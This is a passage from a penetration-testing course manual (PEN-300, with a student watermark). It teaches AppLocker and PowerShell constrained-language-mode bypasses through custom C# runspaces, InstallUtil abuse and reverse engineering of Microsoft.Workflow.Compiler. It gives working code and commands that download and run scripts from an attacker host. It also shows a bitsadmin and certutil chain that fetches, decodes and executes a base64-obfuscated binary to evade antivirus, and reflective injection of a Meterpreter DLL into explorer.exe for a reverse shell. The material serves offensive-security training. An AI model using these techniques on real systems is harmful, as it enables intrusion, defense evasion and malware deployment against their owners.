            Runspace rs = RunspaceFactory.CreateRunspace(); 
            rs.Open(); 
        } 
    } 
} 
Listing 340 - Creating a custom runspace with CreateRunspace 
Unfortunately, Visual Studio can not locate System.Management.Automation.Runspaces, to 
resolve this, we must manually add the assembly reference. First we’ll right-click the References 
folder in the Solution Explorer and select Add Reference…. In most cases, the reference can be 
found in existing assemblies, but in this particular case, we’ll need to specify a file location 
instead. 
To do this, we’ll select the Browse… button at the bottom of the window and navigate to the 
C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35 
folder where we will select System.Management.Automation.dll. 
After adding the assembly reference, the previous errors are resolved. Now we can dig into the 
code. 
Calling CreateRunspace creates a custom runspace and returns a Runspace object.440 We can 
invoke the Open method441 on this object, after which we may interact with the custom runspace. 
With the custom runspace created, we can instantiate a PowerShell object and assign the 
runspace to it which allows us to pass and invoke arbitrary PowerShell commands. This is 
implemented through the Create442 method of the PowerShell class443 as shown in Listing 341. 
PowerShell ps = PowerShell.Create(); 
ps.Runspace = rs; 
Listing 341 - Instantiating a PowerShell object and setting the runspace 
The final line of code above will set the runspace property444 to our custom runspace. 
 
440 (Microsoft, 2020), https://docs.microsoft.com/en-
us/dotnet/api/system.management.automation.runspaces.runspace?view=powershellsdk-1.1.0 
441 (Microsoft, 2020), https://docs.microsoft.com/en-
us/dotnet/api/system.management.automation.runspaces.runspace.open?view=powershellsdk-
1.1.0#System_Management_Automation_Runspaces_Runspace_Open 
442 (Microsoft, 2020), https://docs.microsoft.com/en-us/dotnet/api/system.management.automation.powershell.create?view=pscore-
6.2.0#System_Management_Automation_PowerShell_Create 
443 (Microsoft, 2020), https://docs.microsoft.com/en-us/dotnet/api/system.management.automation.powershell?view=pscore-6.2.0 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
282 
At this point we have created a custom runspace and associated it with a PowerShell object and 
we are ready to pass in a command or script and execute it. 
As 
a 
proof 
of 
concept, 
we’ll 
simply 
write 
the 
contents 
of 
the 
$ExecutionContext.SessionState.LanguageMode variable to a file so we can verify the language 
mode of the custom runspace. This is implemented in the code snippet shown in Listing 342: 
String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath 
C:\\Tools\\test.txt"; 
ps.AddScript(cmd); 
ps.Invoke(); 
rs.Close(); 
Listing 342 - Adding a PowerShell script and executing it 
The PowerShell script is added to the pipeline through the AddScript method,445 after which the 
Invoke method446 is used to execute the script. Finally, the Close method447 is called to close the 
custom runspace for cleanup. 
Before compiling the project, we’ll switch from “Debug” to “Release” mode and select 64-bit for 
compilation. After compilation we’ll copy the executable to the Windows 10 victim VM and 
execute it: 
C:\Users\student> Bypass.exe 
This program is blocked by group policy. For more information, contact your system 
administrator.  
Listing 343 - Failure to execute the compiled executable 
AppLocker blocks our C# executable because we executed it from a non-whitelisted directory. So 
let’s copy the executable into a whitelisted directory to verify our constrained language mode 
bypass: 
C:\Users\student> copy Bypass.exe C:\Windows\Tasks 
C:\Users\student> C:\Windows\Tasks\Bypass.exe  
C:\Users\student> type C:\Tools\test.txt 
FullLanguage 
Listing 344 - Constrained language mode is bypassed 
Our PowerShell script executed without restrictions inside the custom runspace, and our code 
achieved the desired goal. Good. 
 
444 (Microsoft, 2020), https://docs.microsoft.com/en-
us/dotnet/api/system.management.automation.powershell.runspace?view=pscore-
6.2.0#System_Management_Automation_PowerShell_Runspace 
445 (Microsoft, 2020), https://docs.microsoft.com/en-
us/dotnet/api/system.management.automation.powershell.addscript?view=pscore-
6.2.0#System_Management_Automation_PowerShell_AddScript_System_String_ 
446 (Microsoft, 2020), https://docs.microsoft.com/en-us/dotnet/api/system.management.automation.powershell.invoke?view=pscore-
6.2.0#System_Management_Automation_PowerShell_Invoke 
447 (Microsoft, 2020), https://docs.microsoft.com/en-
us/dotnet/api/system.management.automation.runspaces.runspace.close?view=powershellsdk-
1.1.0#System_Management_Automation_Runspaces_Runspace_Close 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
283 
Additionally, we did not use PowerShell.exe, which means that even if an AppLocker deny rule was 
configured to block its execution, we could still use this method to run arbitrary PowerShell 
scripts. 
As an expanded use case, let’s leverage the custom runspace to fetch and execute the 
PowerUp448 PowerShell privilege escalation enumeration script. We’ll download the script and 
copy it to our Kali machine’s Apache webserver, and update the C# application to invoke inside 
the custom runspace: 
String cmd = "(New-Object 
System.Net.WebClient).DownloadString('http://192.168.119.120/PowerUp.ps1') | IEX; 
Invoke-AllChecks | Out-File -FilePath C:\\Tools\\test.txt"; 
Listing 345 - Script to fetch and execute PowerUp in a custom runspace 
Once the C# project has been modified with the new script and recompiled, we can execute the 
C# executable and enumerate possible avenues of privilege escalation: 
C:\Users\student> C:\Windows\Tasks\Bypass.exe 
C:\Users\student> type C:\Tools\test.txt 
 
[*] Running Invoke-AllChecks 
 
 
[*] Checking if user is in a local group with administrative privileges... 
 
 
[*] Checking for unquoted service paths... 
... 
Listing 346 - Executing PowerUp while bypassing constrained language mode 
The power of custom runspaces allows us to reuse all our previous PowerShell-based tradecraft. 
However, we are still hindered by AppLocker’s C# executable rules. In the next section, we’ll solve 
this problem by using a technique called living off the land, in which we misuse a native Windows 
application. 
8.3.2.1 Exercises 
1. 
Recreate the application shown in this section to set up a custom runspace and execute 
arbitrary PowerShell code without limitations. 
2. 
Modify the C# code to implement our PowerShell shellcode runner. 
3. 
Create an AppLocker deny rule for 
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe and verify that this does not 
hinder our custom runspace. 
8.3.3 PowerShell CLM Bypass 
In the last section, we bypassed constrained language mode in PowerShell but ended up needing 
the ability to bypass the AppLocker executable rules for a C# application. In this section, we’ll 
 
448 (Microsoft, 2020), https://github.com/EmpireProject/Empire/blob/master/data/module_source/privesc/PowerUp.ps1 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
284 
demonstrate how native Windows applications can be abused to bypass AppLocker by fooling 
the filter driver. 
In this section we will leverage InstallUtil,449 a command-line utility that allows us to install 
and uninstall server resources by executing the installer components in a specified assembly. 
This Microsoft-supplied tool obviously has legitimate uses, but we can abuse it to execute 
arbitrary C# code. Our goal is to reintroduce our PowerShell shellcode runner tradecraft in an 
AppLocker-protected environment. 
To use InstallUtil in this way, we must put the code we want to execute inside either the install or 
uninstall methods of the installer class.450 
We are only going to use the uninstall method since the install method requires administrative 
privileges to execute. 
Using the MSDN documentation as a guide, we can build the following proof-of-concept: 
using System; 
using System.Configuration.Install; 
 
namespace Bypass 
{ 
    class Program 
    { 
        static void Main(string[] args) 
        { 
            // TO DO 
        } 
    } 
 
    [System.ComponentModel.RunInstaller(true)] 
    public class Sample : System.Configuration.Install.Installer 
    { 
        public override void Uninstall(System.Collections.IDictionary savedState) 
        { 
          // TO DO 
        } 
    } 
} 
Listing 347 - Framework proof of concept for installutil 
There are a few things to note about this code. First, the System.Configuration.Install namespace 
is missing an assembly reference in Visual Studio. We can add this by again right-clicking on 
References in the Solution Explorer and choosing Add References…. From here, we’ll navigate to 
the Assemblies menu on the left-hand side and scroll down to System.Configuration.Install, as 
shown in Figure 105. 
 
449 (Microsoft, 2017), https://docs.microsoft.com/en-us/dotnet/framework/tools/installutil-exe-installer-tool 
450 (Microsoft, 2020), https://docs.microsoft.com/en-us/dotnet/api/system.configuration.install.installer?view=netframework-4.8 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
285 
 
Figure 105: Adding an assembly reference to System.Configuration.Install 
Once the assembly reference has been added the displayed errors are resolved. Although our 
code uses both the Main method and the Uninstall method, content in the Main method is not 
important in this example. However, the method itself must be present in the executable. 
Since the content of the Main method is not part of the application whitelisting 
bypass, we could use it for other purposes, like bypassing antivirus. 
Inside the Uninstall method, we can execute arbitrary C# code. In this case, we will use the 
custom runspace code we developed in the previous section. The combined code is shown in 
Listing 348. 
using System; 
using System.Management.Automation; 
using System.Management.Automation.Runspaces; 
using System.Configuration.Install; 
 
namespace Bypass 
{ 
    class Program 
    { 
        static void Main(string[] args) 
        { 
            Console.WriteLine("This is the main method which is a decoy"); 
        } 
    } 
 
    [System.ComponentModel.RunInstaller(true)] 
    public class Sample : System.Configuration.Install.Installer 
    { 
        public override void Uninstall(System.Collections.IDictionary savedState) 
        { 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
286 
            String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -
FilePath C:\\Tools\\test.txt"; 
            Runspace rs = RunspaceFactory.CreateRunspace(); 
            rs.Open(); 
 
            PowerShell ps = PowerShell.Create(); 
            ps.Runspace = rs; 
 
            ps.AddScript(cmd); 
 
            ps.Invoke(); 
 
            rs.Close(); 
        } 
    } 
} 
Listing 348 - Custom runspace C# code inside Uninstall method 
With the executable compiled and copied to the Windows 10 victim machine, we’ll execute it from 
an administrative command prompt: 
C:\Tools>Bypass.exe 
This is the main method which is a decoy 
Listing 349 - Executing the main method with an administrative command prompt 
As shown in the output, the Main method executed. If we run it from a non-administrative 
command prompt (Listing 350), AppLocker blocks it. 
To trigger our constrained language mode bypass code, we must invoke it through InstallUtil with 
/logfile to avoid logging to a file, /LogToConsole=false to suppress output on the console 
and /U to trigger the Uninstall method: 
C:\Users\student>C:\Tools\Bypass.exe 
This program is blocked by group policy. For more information, contact your system 
administrator. 
 
C:\Users\student>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe 
/logfile= /LogToConsole=false /U C:\Tools\Bypass.exe 
Microsoft (R) .NET Framework Installation utility Version 4.8.3752.0 
Copyright (C) Microsoft Corporation.  All rights reserved. 
 
 
C:\Users\student>type C:\Tools\test.txt 
FullLanguage 
Listing 350 - Execution of custom runspace code through installutil 
The output in Listing 350 shows that InstallUtil is allowed to execute. It started the .NET 
Framework Installation utility and the test.txt output shows that our PowerShell script executed 
without restrictions. Excellent! 
At this point, it would be possible to reuse this tradecraft with the Microsoft Word 
macros we developed in a previous module since they are not limited by 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
287 
AppLocker. Instead of using WMI to directly start a PowerShell process and 
download the shellcode runner from our Apache web server, we could make WMI 
execute InstallUtil and obtain the same result despite AppLocker. 
There is, however, a slight issue; the compiled C# file has to be on disk when InstallUtil is invoked. 
This requires two distinct actions. First, we must download an executable, and secondly, we must 
ensure that it is not flagged by antivirus, neither during the download process nor when it is saved 
to disk. We could use VBA code to do this, but it is simpler to rely on other native Windows 
binaries, which are whitelisted by default. 
To attempt to bypass anitvirus, we are going to obfuscate the executable while it is being 
downloaded with Base64 encoding and then decode it on disk. Well use the native certutil451 
tool to perform the encoding and decoding and bitsadmin452 for the downloading. By using 
native tools in unexpected and interesting ways, we will be “Living Off The Land”. 
There are a couple of steps involved in setting this up, so let’s take them one at a time. First, we’ll 
use certutil on our Windows 10 development machine to Base64-encode the compiled 
executable. This is done by supplying the -encode flag: 
C:\Users\Offsec>certutil -encode 
C:\Users\Offsec\source\repos\Bypass\Bypass\bin\x64\Release\Bypass.exe file.txt 
Input Length = 5120 
Output Length = 7098 
CertUtil: -encode command completed successfully. 
C:\Users\Offsec>type file.txt 
-----BEGIN CERTIFICATE----- 
TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
AAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5v 
dCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAAZIYCAHFjntgAAAAA 
AAAAAPAAIgALAjAAAAwAAAAGAAAAAAAAAAAAAAAgAAAAAABAAQAAAAAgAAAAAgAA 
... 
Listing 351 - Base64 encoding the executable with certutil 
Now that the binary has been Base64-encoded, we’ll copy it to the web root of our Kali machine 
and ensure that Apache is running. Then we’ll use bitsadmin to download the encoded file. 
Certutil can also be used to download files over HTTP(S), but this triggers 
antivirus due to its widespread malicious usage. 
To download the file, we’ll specify the /Transfer option along with a custom name for the 
transfer and the download URL: 
C:\Users\student>bitsadmin /Transfer myJob http://192.168.119.120/file.txt 
C:\Users\student\enc.txt 
 
451 (Microsoft, 2017), https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil 
452 (Microsoft, 2017), https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/bitsadmin-transfer 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
288 
 
DISPLAY: 'myJob' TYPE: DOWNLOAD STATE: ACKNOWLEDGED 
PRIORITY: NORMAL FILES: 1 / 1 BYTES: 7098 / 7098 (100%) 
Transfer complete. 
Listing 352 - Downloading the Base64 encoded executable with bitadmin 
With the file downloaded we can decode it with certutil -decode: 
C:\Users\student>certutil -decode enc.txt Bypass.exe 
Input Length = 7098 
Output Length = 5120 
CertUtil: -decode command completed successfully. 
 
C:\Users\student>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe 
/logfile= /LogToConsole=false /U C:\users\student\Bypass.exe 
Microsoft (R) .NET Framework Installation utility Version 4.8.3752.0 
Copyright (C) Microsoft Corporation.  All rights reserved. 
Listing 353 - Decoding with certutil and executing with installutil 
As shown in Listing 353, we executed the decoded executable with InstallUtil and bypassed both 
AppLocker’s executable rules and PowerShell’s constrained language mode. 
Since all of these commands are executed sequentially we can combine them on the command 
line through the && syntax:453 
C:\Users\student>bitsadmin /Transfer myJob http://192.168.119.120/file.txt 
C:\users\student\enc.txt && certutil -decode C:\users\student\enc.txt 
C:\users\student\Bypass.exe && del C:\users\student\enc.txt && 
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= 
/LogToConsole=false /U C:\users\student\Bypass.exe   
Listing 354 - Complete combined command to download, decode and execute the bypass 
Our bypasses were again successful. Very Nice. 
In this section, we further developed our tradecraft to allow arbitrary C# execution and 
unrestricted PowerShell execution despite application whitelisting. We are now able to reuse our 
existing client-side code execution techniques from Microsoft Office. 
8.3.3.1 Exercises 
1. 
Implement the constrained language mode bypass using InstallUtil as demonstrated in this 
section. 
2. 
Create or modify a Microsoft Word macro to use the whitelisting bypass and launch a 
PowerShell shellcode runner. 
8.3.4 Reflective Injection Returns 
In an earlier module, we used the Invoke-ReflectivePEInjection PowerShell script to inject an 
unmanaged Meterpreter DLL into a process with reflective DLL injection. However, in a previous 
section, we enabled AppLocker DLL rules to block untrusted DLLs. Let’s try to leverage InstallUtil 
to bypass AppLocker and revive the powerful reflective DLL injection technique. 
 
453 (Microsoft, 2017), https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmd 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
289 
First, we’ll generate a 64-bit Meterpreter DLL and host it on the Apache server on our Kali 
machine. We’ll also upload the Invoke-ReflectivePEInjection.ps1 script from C:\Tools to the 
Apache server to simulate the full attack scenario. 
Next, we’ll modify the cmd variable inside the constrained language mode bypass (the C# 
application developed in the previous sections). Our goal is to download the Meterpreter DLL into 
a byte array, determine the process ID of explorer.exe for the DLL injection and download and 
execute the Invoke-ReflectivePEInjection script. The updated cmd variable is shown in Listing 355. 
String cmd = "$bytes = (New-Object 
System.Net.WebClient).DownloadData('http://192.168.119.120/met.dll');(New-Object 
System.Net.WebClient).DownloadString('http://192.168.119.120/Invoke-
ReflectivePEInjection.ps1') | IEX; $procid = (Get-Process -Name explorer).Id; Invoke-
ReflectivePEInjection -PEBytes $bytes -ProcId $procid"; 
Listing 355 - Reflectively loading Meterpreter DLL into explorer.exe 
Since we pass the script on a single line, we used the ; command terminator to supply multiple 
commands at once. 
When we compile and execute the C# application through InstallUtil, it generates a reverse shell, 
proving that the unmanaged DLL successfully loaded, bypassing AppLocker’s DLL rules. 
8.3.4.1 Exercise 
1. 
Repeat the actions in this section to obtain a reverse shell by reflectively loading the 
Meterpreter DLL. 
8.4 Bypassing AppLocker with C 
We have successfully bypassed AppLocker’s PowerShell restrictions and have executed arbitrary 
managed C# and PowerShell code through InstallUtil. However, this relies on the existence of a 
single binary. If InstallUtil was blocked by a deny rule, this technique would fail. Let’s improve our 
tradecraft by building another AppLocker bypass in C#.454 
In addition to providing an alternative bypass method for C# code execution, this process 
demonstrates basic techniques which could aid future research. Discovering a bypass is not 
completely trivial, so we’ll divide this process into a number of steps. 
8.4.1 Locating a Target 
To begin, let’s discuss the components of an AppLocker bypass. Our ultimate goal is to execute 
arbitrary C# code via a whitelisted application, which means our target application must either 
accept a pre-compiled executable as an argument and load it into memory or compile it itself. In 
addition, the target application must obviously execute our code. 
 
454 (Matt Graeber, 2018), https://posts.specterops.io/arbitrary-unsigned-code-execution-vector-in-microsoft-workflow-compiler-exe-
3d9294bc5efb 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
290 
Either way, the whitelisted application must load unsigned managed code into memory. This is 
typically done through APIs like Load,455 LoadFile456 or LoadFrom.457 
The first step in this process is therefore to locate native compiled managed code that performs 
these actions. While it may seem logical to simply scan each assembly for one of these loading 
methods, the compilation and loading processes are typically performed by nested method calls 
inside core DLLs. 
Still, we could scan a compiled assembly for references to either of the previously mentioned 
methods through the dnlib458 external library or with the LoadMethodScanner developed by 
security researcher Matt Graeber (@mattifestation).459 Although this approach automates the 
search process and scales well, developing the test harness requires significant preparation. 
Alternatively, we could reverse engineer assemblies which reside in whitelisted locations in 
search of the code segments that either load precompiled managed code or use source code 
which is compiled as part of the processing. Once identified, these code segments must execute 
the code we provide after it is loaded into memory. 
In the following sections, we’ll leverage this second approach, focussing on the 
System.Workflow.ComponentModel.dll assembly which is vulnerable to a relatively new 
AppLocker bypass.460 
This assembly is located in the C:\Windows\Microsoft.NET\Framework64\v4.0.30319 directory 
which is whitelisted by AppLocker’s default path rules. Additionally the assembly is signed by 
Microsoft, so it is whitelisted through a default publisher rule. 
Let’s reverse engineer the assembly, locate the specific logic we will use to bypass AppLocker 
and finally, weaponize it. 
Note that this process could easily be performed on any assembly to locate new 
application whitelisting bypasses which could yield numerous results given the 
variety of new applications and libraries included with each Windows update. 
8.4.2 Reverse Engineering for Load 
Let’s begin the process of locating a Load call inside System.Workflow.ComponentModel.dll. 
 
455 (Microsoft, 2020), https://docs.microsoft.com/en-
us/dotnet/api/system.reflection.assembly.load?redirectedfrom=MSDN&view=netframework-
4.8#System_Reflection_Assembly_Load_System_Byte___ 
456 (Microsoft, 2020), https://docs.microsoft.com/en-us/dotnet/api/system.reflection.assembly.loadfile?view=netframework-4.8 
457 (Microsoft, 2020), https://docs.microsoft.com/en-us/dotnet/api/system.reflection.assembly.loadfrom?view=netframework-4.8 
458 (@0xd4d, 2020), https://github.com/0xd4d/dnlib 
459 (Matt Graeber, 2018), https://gist.github.com/mattifestation/67435063004effaac02809506890c7bb 
460 (Matt Graeber, 2018), https://posts.specterops.io/arbitrary-unsigned-code-execution-vector-in-microsoft-workflow-compiler-exe-
3d9294bc5efb 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
291 
Since we are reverse-engineering managed code, we’ll need a new tool. We’ll use dnSpy461 which 
is the tool of choice for disassembling and performing reverse engineering on compiled .NET 
code. This tool has been installed on the Windows 10 victim machine, and a shortcut has been 
placed on the taskbar. Thanks to application whitelisting, we must launch dnSpy as an 
administrative user. 
After launching dnSpy we’ll navigate to File -> Open, browse to the target assembly and select 
Open. This will load System.Workflow.ComponentModel.dll, automatically decompile it and add it 
to the Assembly Explorer, as shown in Figure 106. 
 
Figure 106: System.Workflow.ComponentModel.dll is decompiled and shown in dnSpy 
Based on its name alone, the System.Workflow.ComponentModel.Compiler namespace is worth 
investigating since compilation often involves loading a file or data. 
Expanding the namespace reveals the WorkflowCompiler class which contains the Compile 
method. Based on the class and method name, this seems a good starting point for our analysis 
as we are trying to leverage existing functionality within the code base to compile our own C# 
source code and load it in memory. 
There are multiple steps we have to perform as part of this analysis. First, we will begin by 
determining if the Compile method does indeed lead to compilation of source code. If so, we 
 
461 (@0xd4d, 2020), https://github.com/0xd4d/dnSpy 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
292 
must ensure that we are able to invoke this function and supply the source code. Finally, we must 
determine if and how the code is executed. 
The code begins with various argument checks, and eventually executes the statements shown in 
Listing 356: 
56  WorkflowCompilerInternal workflowCompilerInternal = 
(WorkflowCompilerInternal)appDomain.CreateInstanceAndUnwrap(Assembly.GetExecutingAssem
bly().FullName, typeof(WorkflowCompilerInternal).FullName); 
57  WorkflowCompilerResults workflowCompilerResults = 
workflowCompilerInternal.Compile(parameters, files); 
Listing 356 - Call to WorkflowCompilerInternal.Compile 
Line 57 highlighted above calls into the internal Compile method in the WorkflowCompilerInternal 
namespace. If we click on the method name, dnSpy will jump to that code and display it. 
The initial instructions validate the arguments. The instructions shown below are found further 
down in the code: 
89  using (WorkflowCompilationContext.CreateScope(serviceContainer, parameters)) 
90  { 
91    parameters.LocalAssembly = this.GenerateLocalAssembly(array, array2, parameters, 
workflowCompilerResults, out tempFileCollection, out empty, out text4); 
92      if (parameters.LocalAssembly != null) 
93      { 
94        referencedAssemblyResolver.SetLocalAssembly(parameters.LocalAssembly); 
95          typeProvider.SetLocalAssembly(parameters.LocalAssembly); 
96          typeProvider.AddAssembly(parameters.LocalAssembly); 
97          workflowCompilerResults.Errors.Clear(); 
98          XomlCompilerHelper.InternalCompileFromDomBatch(array, array2, parameters, 
workflowCompilerResults, empty); 
99      } 
100 } 
Listing 357 - Call to GenerateLocalAssembly and InternalCompileFromDomBatch 
The GenerateLocalAssembly and InternalCompileFromDomBatch methods are especially 
interesting given that we are searching for a code segment responsible for compiling managed 
code. Let’s start with GenerateLocalAssembly and follow it with dnSpy. 
Eventually we reach the code shown in Listing 358: 
291 CompilerResults compilerResults = 
codeDomProvider.CompileAssemblyFromFile(compilerParameters, 
(string[])arrayList3.ToArray(typeof(string))); 
Listing 358 - Call to CompileAssemblyFromFile 
Based on the name alone, the CompileAssemblyFromFile method from the CodeDomProvider 
namespace is worth investigating. Following the call to this method reveals that this is a small 
wrapper method for CompileAssemblyFromFileBatch: 
176 public virtual CompilerResults CompileAssemblyFromFile(CompilerParameters options, 
params string[] fileNames) 
177 { 
178     return this.CreateCompilerHelper().CompileAssemblyFromFileBatch(options, 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
293 
fileNames); 
179 } 
Listing 359 - Call to CompileAssemblyFromFileBatch 
At this point, we are quite deep into the code. Let’s take a moment to investigate this method to 
validate that we’re on the right track. MSDN462 confirms that CompileAssemblyFromFileBatch 
does indeed compile an assembly, as the name suggests. Good. We’re headed in the right 
direction. Let’s continue. 
If we follow the call into CompileAssemblyFromFileBatch, we only find the method definition as 
shown in Listing 360. There is no function implementation because this is part of an interface.463 
4 namespace System.CodeDom.Compiler 
5 { 
6   // Token: 0x0200067A RID: 1658 
7   public interface ICodeCompiler 
8   { 
...  
30    [PermissionSet(SecurityAction.LinkDemand, Name = "FullTrust")] 
31      [PermissionSet(SecurityAction.InheritanceDemand, Name = "FullTrust")] 
32      CompilerResults CompileAssemblyFromFileBatch(CompilerParameters options, 
string[] fileNames); 
Listing 360 - Function definition of CompileAssemblyFromFileBatch 
To find the implementation of the interface from the System.CodeDom.Compiler namespace, we’ll 
right-click the method name and select Analyze, which will open a pane in the lower right-hand 
side of the application. We can expand this by clicking Implemented By as shown in Figure 107. 
 
Figure 107: Analyzing the CompileAssemblyFromFileBatch method in dnSpy 
Now 
we 
can 
double-click 
the 
second 
entry 
to 
find 
the 
implementation 
of 
CompileAssemblyFromFileBatch as shown in Listing 361. 
94  CompilerResults ICodeCompiler.CompileAssemblyFromFileBatch(CompilerParameters 
options, string[] fileNames) 
95  { 
96    if (options == null) 
97      { 
98        throw new ArgumentNullException("options"); 
99      } 
100     if (fileNames == null) 
101     { 
102         throw new ArgumentNullException("fileNames"); 
 
462 (Microsoft, 2020), https://docs.microsoft.com/en-
us/dotnet/api/system.codedom.compiler.icodecompiler.compileassemblyfromfilebatch?view=dotnet-plat-ext-
3.1#System_CodeDom_Compiler_ICodeCompiler_CompileAssemblyFromFileBatch_System_CodeDom_Compiler_CompilerParameter
s_System_String___ 
463 (Microsoft, 2020), https://docs.microsoft.com/en-us/dotnet/csharp/language-reference/keywords/interface 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
294 
103     } 
104     CompilerResults result; 
106     try 
107     { 
108         foreach (string path in fileNames) 
109         { 
110             using (File.OpenRead(path)) 
111             { 
112             } 
113         } 
114         result = this.FromFileBatch(options, fileNames); 
115     } 
116     finally 
117     { 
118         options.TempFiles.SafeDelete(); 
119     } 
120     return result; 
Listing 361 - Source code of CompileAssemblyFromFileBatch 
As highlighted in the code, the method validates the supplied file paths and then calls 
FromFileBatch. 
Within FromFileBatch, we find a call to the Compile method, where the C# code supplied through 
fileNames is finally compiled: 
323 string text = this.CmdArgsFromParameters(options) + " " + 
CodeCompiler.JoinStringArray(fileNames, " "); 
324 string responseFileCmdArgs = this.GetResponseFileCmdArgs(options, text); 
325 string trueArgs = null; 
326 if (responseFileCmdArgs != null) 
327 { 
328     trueArgs = text; 
329     text = responseFileCmdArgs; 
330 } 
331 this.Compile(options, Executor.GetRuntimeInstallDirectory(), this.CompilerName, 
text, ref path, ref num, trueArgs); 
Listing 362 - Call to Compile that compiles the source code 
Further on after the source code has been compiled and stored in the array variable, we locate the 
code we have been searching for: 
373 try 
374 { 
375   if (!FileIntegrity.IsEnabled) 
376   { 
377       compilerResults.CompiledAssembly = Assembly.Load(array, null, 
options.Evidence); 
378         return compilerResults; 
379     } 
Listing 363 - Loading the compiled assembly 
The code shown in Listing 363 loads the now-compiled assembly with Assembly.Load. Very nice. 
The only caveat is that this call is only triggered if the file integrity property is not enabled 
(“!FileIntegrity.IsEnabled”). 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
295 
Let’s investigate FileIntegrity to determine if it will be enabled in our scenario. 
Matt Graeber writes on his blog464 that when the FileIntegrity.IsEnabled property is evaluated, a 
call is made to WldpIsDynamicCodePolicyEnabled,465 which will only return true if WDAC is 
enabled and certain specific policies are enforced. Since we are only dealing with AppLocker, this 
does not apply to us, and this code path will execute. 
At 
this 
point, 
we 
have 
made 
significant 
progress 
reverse 
engineering 
the 
System.Workflow.ComponentModel.dll assembly. We have found a code path that compiles and 
loads C# source code based on given input files. 
Before we go any further with the analysis we must ensure that we are actually able to invoke the 
Compile method from the WorkflowCompiler class inside System.Workflow.ComponentModel.dll. 
Additionally we must determine if we are able to control the arguments provided to it. 
To find an executable that invokes the Compile method, we’ll navigate back to it in dnSpy. Next, 
we’ll right-click the method name and select Analyze, which will open a pane in the lower right-
hand side of the application, as shown in Figure 108. 
 
Figure 108: Analyzing the Compile method in dnSpy 
Next, 
we’ll 
expand 
the 
“Used 
By” 
section, 
which 
reveals 
two 
entries 
including 
Microsoft.Workflow.Compiler.Program.Main. This is the Main method of an executable, which 
means the Compile method is called directly from this .NET application. 
 
464 (Matt Graeber, 2018), https://posts.specterops.io/documenting-and-attacking-a-windows-defender-application-control-feature-the-
hard-way-a-case-73dd1e11be3a 
465 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/devnotes/wldpisdynamiccodepolicyenabled 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
296 
Double-clicking on the entry will open the relevant assembly in dnSpy which will automatically 
present its code. Additionally, the Assembly Explorer neatly displays the application name as 
Microsoft.Workflow.Compiler: 
 
Figure 109: Executable calling the Compile method 
To locate this file on disk we can right-click on the assembly in Assembly Explorer and choose 
“Open Containing Folder”, which opens C:\Windows\Microsoft.NET\Framework64\v4.0.30319 in 
File Explorer. Alternatively, we could hover over the assembly name in Assembly Explorer to 
display the path name. 
At this point we have found a way to trigger the Compile method directly from a native and signed 
Microsoft application. We must also determine if the arguments supplied to Compile come 
directly from Microsoft.Workflow.Compiler. 
We will start this analysis from the Main method of Microsoft.Workflow.Compiler.exe and inspect 
the arguments it accepts. The Main method is shown in Listing 364. 
3 private static void Main(string[] args) 
4 { 
5   if (args == null || args.Length != 2) 
6   { 
7     throw new ArgumentException(WrapperSR.GetString("InvalidArgumentsToMain"), 
"args"); 
8   } 
